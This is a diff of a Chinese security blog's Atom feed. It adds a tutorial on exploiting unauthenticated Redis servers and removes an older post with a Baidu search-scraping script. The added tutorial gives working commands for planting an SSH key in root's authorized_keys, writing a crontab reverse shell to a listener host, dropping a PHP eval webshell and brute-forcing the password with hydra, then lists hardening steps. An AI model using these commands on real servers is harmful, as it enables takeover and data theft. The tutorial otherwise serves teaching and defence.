@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://y-hkl.top/"/>
-  <updated>2018-02-26T06:21:25.151Z</updated>
+  <updated>2018-03-19T05:36:35.442Z</updated>
   <id>http://y-hkl.top/</id>
   
   <author>
@@ -14,6 +14,105 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>redis未授权访问</title>
+    <link href="http://y-hkl.top/2018/03/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>http://y-hkl.top/2018/03/18/redis未授权访问/</id>
+    <published>2018-03-19T03:38:37.000Z</published>
+    <updated>2018-03-19T05:36:35.442Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。<br><a id="more"></a></p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
+<p>目前比较主流的案例：yam2 minerd 挖矿程序</p>
+<h2 id="Redis安全漏洞影响"><a href="#Redis安全漏洞影响" class="headerlink" title="Redis安全漏洞影响"></a>Redis安全漏洞影响</h2><p>一旦入侵成功，Redis数据会丢失，攻击者可直接添加账号用于ssh远程登录控制服务器，会给用户的 Redis 运行环境以及 Linux 主机造成安全风险，引发重要数据删除、泄露或加密勒索事件发生。<br><img src="/upload_img/redis_1.png" alt=""></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载redis<br>Wget <a href="http://download.redis.io/releases/redis-2.6.14.tar.gz" target="_blank" rel="external">http://download.redis.io/releases/redis-2.6.14.tar.gz</a><br>解压<br>tar zxvf redis-2.6.14.tar.gz<br>cd redis-2.6.14<br>编译<br>make<br><img src="/upload_img/redis_2.png" alt=""><br>cd src<br>安装<br>make install<br>启动<br>redis-server &amp;<br>连接测试<br>redis-cli<br><img src="/upload_img/redis_3.png" alt=""></p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>redis默认使用的是6379端口，可以使用nmap来验证这个漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nmap -A -p 6379 –script redis-info 192.168.10.129</div></pre></td></tr></table></figure></p>
+<p><img src="/upload_img/redis_4.png" alt=""></p>
+<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div><div class="line">info</div></pre></td></tr></table></figure></p>
+<p><img src="/upload_img/redis_5.png" alt=""><br>可以看到Redis的版本和服务器上内核版本信息，如果是新版的Redis2.8以后的版本还可以看到Redis配置文件的绝对路径</p>
+<h3 id="写入SSH公钥，获取操作系统权限"><a href="#写入SSH公钥，获取操作系统权限" class="headerlink" title="写入SSH公钥，获取操作系统权限"></a>写入SSH公钥，获取操作系统权限</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.redis对外开放，且未授权访问（默认配置）<br>2.服务器的ssh对外开放，可通过key登录</p>
+<h4 id="攻击详情"><a href="#攻击详情" class="headerlink" title="攻击详情"></a>攻击详情</h4><ol>
+<li>生成公钥<br>在攻击电脑上生成自己的公钥，一直按回车不用输入任何东西<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_6.png" alt=""></p>
+<ol>
+<li>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</div><div class="line"></div><div class="line">cat /root/.ssh/key.txt | ./redis-cli -h 漏洞服务器IP -x set xxx</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_7.png" alt=""></p>
+<ol>
+<li><p>连接漏洞服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div></pre></td></tr></table></figure>
+</li>
+<li><p>设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dir /root/.ssh</div><div class="line">config set dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_8.png" alt=""></p>
+<ol>
+<li>使用SSH连接漏洞服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 漏洞服务器IP</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_9.png" alt=""><br>可以看到不用密码就可以直接远程登录</p>
+<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h4><p>在攻击者服务器上监听一个端口（任意端口）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div></pre></td></tr></table></figure></p>
+<h4 id="攻击详情-1"><a href="#攻击详情-1" class="headerlink" title="攻击详情"></a>攻击详情</h4><p>连接redis，写入反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</div><div class="line">config set dir /var/spool/cron</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>1分钟后客户端这边收到centos的反弹shell<br><img src="/upload_img/redis_10.png" alt=""></p>
+<h3 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a>获取web服务的webshell</h3><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">config set dir /var/www/html</div><div class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</div><div class="line">config set dbfilename webshell.php</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>注意：要知道web服务器的绝对路径</p>
+<h2 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h2><p>使用hydra工具可以对redis进行暴力破解<br>hydra -P passwd.txt redis://漏洞服务器IP</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
+<li>禁止一些高危命令（重启redis才能生效）<br>修改 redis.conf 文件，禁用远程修改 DB 文件地址<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;&quot;</div><div class="line">rename-command CONFIG &quot;&quot;</div><div class="line">rename-command EVAL &quot;&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>或者通过修改redis.conf文件，改变这些高危命令的名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;name1&quot;</div><div class="line">rename-command CONFIG &quot;name2&quot;</div><div class="line">rename-command EVAL &quot;name3&quot;</div></pre></td></tr></table></figure></p>
+<ul>
+<li><p>以低权限运行 Redis 服务（重启redis才能生效）<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</div></pre></td></tr></table></figure>
+</li>
+<li><p>为 Redis 添加密码验证（重启redis才能生效）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requirepass mypassword</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p>
+<ul>
+<li>禁止外网访问 Redis（重启redis才能生效）<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind 127.0.0.1</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
+<ul>
+<li>修改默认端口<br>修改配置文件redis.conf文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Port 6379</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
+<ul>
+<li>保证 authorized_keys 文件的安全<br>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 400 ~/.ssh/authorized_keys</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
+<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh</div></pre></td></tr></table></figure></p>
+<ul>
+<li>设置防火墙策略<br>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</li>
+<li>安全补丁<br>不定期关注最新软件版本，并升级redis到最新版，防止新漏洞被利用。</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h2&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="redis" scheme="http://y-hkl.top/tags/redis/"/>
+    
+      <category term="redis未授权访问" scheme="http://y-hkl.top/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
   
   <entry>
     <title>使用Nmap验证漏洞</title>
@@ -723,9 +822,9 @@
       <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
     
-      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
       <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
+    
+      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
@@ -762,9 +861,9 @@
       <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
     
-      <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
-    
       <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="s2-052" scheme="http://y-hkl.top/tags/s2-052/"/>
     
   </entry>
   
@@ -847,34 +946,6 @@
     
     
       <category term="服务器解析漏洞" scheme="http://y-hkl.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>爬取百度搜索</title>
-    <link href="http://y-hkl.top/2017/09/01/%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2/"/>
-    <id>http://y-hkl.top/2017/09/01/爬取百度搜索/</id>
-    <published>2017-09-01T06:31:09.000Z</published>
-    <updated>2017-09-01T06:59:40.459Z</updated>
-    
-    <content type="html"><![CDATA[<p>在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。<br><a id="more"></a></p>
-<h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><h3 id="分析搜索链接"><a href="#分析搜索链接" class="headerlink" title="分析搜索链接"></a>分析搜索链接</h3><p>每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.baidu.com/s?wd=ctf&amp;pn=10</div></pre></td></tr></table></figure></p>
-<h3 id="分析搜索页面中的链接"><a href="#分析搜索页面中的链接" class="headerlink" title="分析搜索页面中的链接"></a>分析搜索页面中的链接</h3><p>F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a target=&quot;_blank&quot; href=&quot;你搜索的URL&quot; class=&quot;c-showurl&quot; style=&quot;text-decoration:none;&quot;&gt;www.php.net/downloa...php</div></pre></td></tr></table></figure></p>
-<p>特征就是class=”c-showurl” 属性值，用bs库去获取所有有这个属性的tagres = soup.find_all(name=”a”, attrs={‘class’:’c-showurl’})</p>
-<h3 id="访问链接"><a href="#访问链接" class="headerlink" title="访问链接"></a>访问链接</h3><p>访问跳转链接获取实际网站url,title之类的信息</p>
-<h2 id="爬虫实现"><a href="#爬虫实现" class="headerlink" title="爬虫实现"></a>爬虫实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#输入格式  python 脚本 -s 内容 -f 要保存的文件名</span></div><div class="line"></div><div class="line"><span class="comment">#每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条</span></div><div class="line"><span class="comment">#https://www.baidu.com/s?wd=ctf&amp;pn=10</span></div><div class="line"><span class="comment">#F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种</span></div><div class="line"><span class="comment">#&lt;a target="_blank" href="http://www.baidu.com/link?url=GI9K125i3rnLbxL2-kKs-2g2OZt-oDTJZZIFjndQHxGiDubfIEpvNxnnCc1h5ags" class="c-showurl" style="text-decoration:none;"&gt;www.secbox.cn/tag/&lt;b&gt;ctf&lt;/b&gt;&amp;nbsp;&lt;/a&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests	</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</div><div class="line"><span class="keyword">import</span> threading	<span class="comment">#多线程</span></div><div class="line"><span class="keyword">import</span> re  <span class="comment">#正则</span></div><div class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue  <span class="comment">#线程优先级队列（ Queue）</span></div><div class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable  <span class="comment">#将输出内容如表格方式整齐 </span></div><div class="line"><span class="keyword">import</span> argparse  <span class="comment">#命令行解析</span></div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">thread_count = <span class="number">3</span> <span class="comment">#进程数</span></div><div class="line">page = <span class="number">5</span> <span class="comment">#可以修改抓取页数</span></div><div class="line">urls = []</div><div class="line"></div><div class="line">table =  PrettyTable([<span class="string">'page'</span>,<span class="string">'url'</span>,<span class="string">'title'</span>]) <span class="comment">#prettyx模块将输出内容如表格方式整齐</span></div><div class="line">table.align[<span class="string">'title'</span>] = <span class="string">'1'</span> <span class="comment">#title左对齐</span></div><div class="line">table.padding_width = <span class="number">1</span>  <span class="comment">#列边和内容之间的一个空格</span></div><div class="line"></div><div class="line">page = (page+<span class="number">1</span>) * <span class="number">10</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">mythread</span><span class="params">(threading.Thread)</span>:</span>  <span class="comment">#继承父类threading.Thread</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.Q = queue</div><div class="line">		self.headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;  <span class="comment">#设置请求头</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>   <span class="comment">##把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 </span></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				t = self.Q.get(<span class="keyword">True</span>,<span class="number">1</span>)</div><div class="line">				<span class="comment">#print t</span></div><div class="line">				self.spider(t)</div><div class="line">			<span class="keyword">except</span> Exception,e:  <span class="comment">#调试最好打印出错信息，否则，spider函数出错也无法定位错误，多次遇到这个问题了,靠打印才解决</span></div><div class="line">				<span class="keyword">print</span> e</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(self,target)</span>:</span>  <span class="comment">#爬取网页链接和标题</span></div><div class="line">		<span class="comment">#print type(target)</span></div><div class="line">		pn =int(target.split(<span class="string">'='</span>)[<span class="number">-1</span>])/<span class="number">10</span> + <span class="number">1</span>  <span class="comment">#对https://www.baidu.com/s?wd=ctf&amp;pn=10分割去最后的数字</span></div><div class="line">		<span class="comment">#print pn</span></div><div class="line">		<span class="comment">#print target</span></div><div class="line">		html = requests.get(target,headers=self.headers)</div><div class="line">		<span class="comment">#print html</span></div><div class="line">		soup = bs(html.text,<span class="string">'lxml'</span>)</div><div class="line">		res = soup.find_all(name=<span class="string">'a'</span>, attrs=&#123;<span class="string">'class'</span>:<span class="string">'c-showurl'</span>&#125;)</div><div class="line">		<span class="comment">#print res</span></div><div class="line">	</div><div class="line">		<span class="keyword">for</span> r <span class="keyword">in</span> res:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				<span class="comment">#因为百度搜索是302跳转，所以我们需要再次请求</span></div><div class="line">				h = requests.get(r[<span class="string">'href'</span>],headers=self.headers,timeout=<span class="number">3</span>)</div><div class="line">				<span class="keyword">if</span> h.status_code == <span class="number">200</span>:</div><div class="line">					url = h.url</div><div class="line">					title =re.findall(<span class="string">r'&lt;title&gt;(.*?)&lt;/title&gt;'</span>,h.content)[<span class="number">0</span>]</div><div class="line">					title = title.decode(<span class="string">'utf-8'</span>)  <span class="comment">#解码成unicode,否则add_row会转换出错</span></div><div class="line">					urls.append((pn,url,title))</div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					<span class="keyword">continue</span></div><div class="line">			<span class="keyword">except</span>:</div><div class="line">				<span class="keyword">continue</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Load_Thread</span><span class="params">(queue)</span>:</span>   <span class="comment">#生成线程数</span></div><div class="line">	<span class="keyword">return</span> [mythread(queue) <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count)]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Start_Thread</span><span class="params">(threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'thread is start...'</span></div><div class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">		t.setDaemon(<span class="keyword">True</span>)</div><div class="line">		t.start()</div><div class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">		t.join()</div><div class="line">	<span class="keyword">print</span> <span class="string">'thread is end...'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	start = time.time()</div><div class="line">	parser = argparse.ArgumentParser()</div><div class="line">	parser.add_argument(<span class="string">'-s'</span>)</div><div class="line">	parser.add_argument(<span class="string">'-f'</span>)</div><div class="line">	arg = parser.parse_args()</div><div class="line">	<span class="comment">#print arg</span></div><div class="line">	</div><div class="line">	word = arg.s</div><div class="line">	output = arg.f</div><div class="line">	<span class="comment"># word = 'inurl:login.action'</span></div><div class="line">	<span class="comment"># output = 'test.txt'</span></div><div class="line">	queue = Queue()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,page,<span class="number">10</span>):</div><div class="line">		target = <span class="string">'https://www.baidu.com/s?wd=%s&amp;pn=%s'</span>%(word,i)</div><div class="line">		queue.put(target)</div><div class="line">	thread_list = Load_Thread(queue)</div><div class="line">	Start_Thread(thread_list)</div><div class="line">	</div><div class="line">	<span class="comment">#把数据写到文件中</span></div><div class="line">	<span class="keyword">if</span> output:</div><div class="line">		<span class="keyword">with</span> open(output,<span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">			<span class="keyword">for</span> record <span class="keyword">in</span> urls:</div><div class="line">				f.write(record[<span class="number">1</span>]+<span class="string">'\n'</span>)</div><div class="line">	<span class="comment">#print urls,len(urls)</span></div><div class="line">	<span class="keyword">for</span> record <span class="keyword">in</span> urls:</div><div class="line">		table.add_row(list(record))  <span class="comment">#在表单中添加数据</span></div><div class="line">	<span class="keyword">print</span> table</div><div class="line">	<span class="keyword">print</span> <span class="string">'共爬取数据%s条'</span>%len(urls)</div><div class="line">	<span class="keyword">print</span> time.time()-start</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="爬虫技术" scheme="http://y-hkl.top/categories/%E7%88%AC%E8%99%AB%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="python爬虫" scheme="http://y-hkl.top/tags/python%E7%88%AC%E8%99%AB/"/>
     
   </entry>
   
